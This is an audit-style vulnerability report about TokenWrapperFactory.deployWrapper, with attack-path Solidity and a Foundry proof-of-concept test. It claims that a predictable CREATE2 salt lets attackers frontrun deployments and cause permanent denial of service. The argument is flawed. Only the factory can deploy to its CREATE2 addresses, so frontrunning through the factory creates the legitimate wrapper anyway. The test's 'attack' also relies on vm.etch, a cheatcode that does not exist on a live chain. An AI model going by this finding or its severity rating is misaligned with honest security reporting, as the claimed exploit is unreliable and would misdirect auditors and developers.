# S1 - Deterministic CREATE2 Salt in TokenWrapperFactory.deployWrapper Enables Permanent Frontrunnable Denial of Service

## Description
The `TokenWrapperFactory` contract deploys new TokenWrapper instances using the CREATE2 opcode with a salt deterministically derived from the underlyingToken and unlockTime. Because this salt is fully predictable and globally shared, any external actor can precompute the deployment address for a specific token and unlockTime pair and frontrun the factory to claim that address.

Once any contract code exists at the computed CREATE2 address, all future attempts by legitimate users to deploy a wrapper for the same configuration will revert permanently. This results in a global and irreversible denial of service for the affected configuration.

## Root Cause

Contract
TokenWrapperFactory.sol

Function
deployWrapper

```solidity
function deployWrapper(IERC20 underlyingToken, uint256 unlockTime)
    external
    returns (TokenWrapper tokenWrapper)
{
    bytes32 salt =
        EfficientHashLib.hash(
            uint256(uint160(address(underlyingToken))),
            unlockTime
        );

    tokenWrapper =
        new TokenWrapper{salt: salt}(CORE, underlyingToken, unlockTime);

    emit TokenWrapperDeployed(underlyingToken, unlockTime, tokenWrapper);
}
```

The salt is derived exclusively from public inputs and is fully predictable.
The same salt is globally reused for a given underlyingToken and unlockTime pair.
CREATE2 enforces address uniqueness and reverts if the target address already contains code.
The factory provides no fallback, detection, or recovery mechanism once the address is occupied.

## Attack Path
An attacker computes the deterministic CREATE2 deployment address for a target configuration.

```solidity
bytes32 salt = hash(uint160(token), unlockTime);
address expectedAddress =
    computeCreate2(factory, salt, wrapperInitCode);
```

The attacker then front runs the legitimate deployment and places code at the expected address, for example by deploying first via the same factory call, deploying arbitrary bytecode at the address using CREATE2, or injecting minimal or dummy code using mechanisms such as vm.etch.

When a legitimate user later calls

TokenWrapperFactory.deployWrapper(token, unlockTime);

the transaction reverts because the target address already contains deployed code.

### Impact and Severity

#### Impact
Permanent and global denial of service for the affected underlyingToken and unlockTime configuration.
All users are prevented from wrapping the asset for the specified unlock schedule.
Yield strategies, pools, staking logic, extensions, and downstream integrations relying on the wrapper may be blocked or corrupted.

#### Severity
Medium

This issue qualifies as Medium severity because there is no direct theft or loss of funds, but a critical system function becomes permanently unavailable.

## Recommended Mitigations

Use a Non Deterministic Salt
Incorporate msg.sender, a user supplied nonce, or another entropy source into the salt to eliminate global predictability.

Restrict or Recover Deployment Rights
Limit wrapper deployment to authorized or whitelisted deployers, or introduce upgrade or overwrite mechanisms for pre deployed wrappers to recover from address squatting.

## Proof of Concept

- Create a file named Create2front.t.sol in the test folder and place the following code inside it.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {TokenWrapperFactory} from "../src/TokenWrapperFactory.sol";
import {TokenWrapper} from "../src/TokenWrapper.sol";
import {EfficientHashLib} from "../lib/solady/src/utils/EfficientHashLib.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {Core} from "../src/Core.sol";
import {ICore, IExtension} from "../src/interfaces/ICore.sol";
import {IERC20} from "../lib/forge-std/src/interfaces/IERC20.sol";

contract Create2DOS is Test {
    TokenWrapperFactory factory;
    IERC20 token;
    ICore core;

    function setUp() public {
        core = new Core();
        token = new MockERC20("MockToken", "MTK", 18);
        factory = new TokenWrapperFactory(core);
    }

    function testPredeploymentDOS() public {
        uint256 unlockTime = 9999999999;
        bytes32 salt =
            EfficientHashLib.hash(uint160(address(token)), unlockTime);

        console.log(
            "[Setup] Calculated salt for token %s and unlockTime %s",
            address(token),
            unlockTime
        );

        TokenWrapper attackerWrapper =
            factory.deployWrapper(token, unlockTime);
        address deployedAddress = address(attackerWrapper);

        console.log(
            "[Attacker] Wrapper deployed at deterministic address: %s",
            deployedAddress
        );

        vm.etch(deployedAddress, hex"60006000");
        console.log(
            "[Attacker] Overwrites bytecode at wrapper address to occupy CREATE2 slot"
        );

        console.log(
            "[Victim] Attempting to deploy wrapper with same parameters -> expecting revert"
        );
        vm.expectRevert();
        factory.deployWrapper(token, unlockTime);
    }
}
```

- Run the following command

forge test --mt testPredeploymentDOS -vv

- Expected Output

```solidity
[PASS] testPredeploymentDOS() (gas: 1040469897)

Logs
[Setup] Calculated salt for token 0x2e234DAe75C793f67A35089C9d99245E1C58470b and unlockTime 9999999999
[Attacker] Wrapper deployed at deterministic address: 0xa00B80DC75018972A5e5b690012087D9e2A7EeF2
[Attacker] Overwrites bytecode at wrapper address to occupy CREATE2 slot
[Victim] Attempting to deploy wrapper with same parameters -> expecting revert

Suite result
ok
1 passed
0 failed
0 skipped
finished in 9.74ms
```
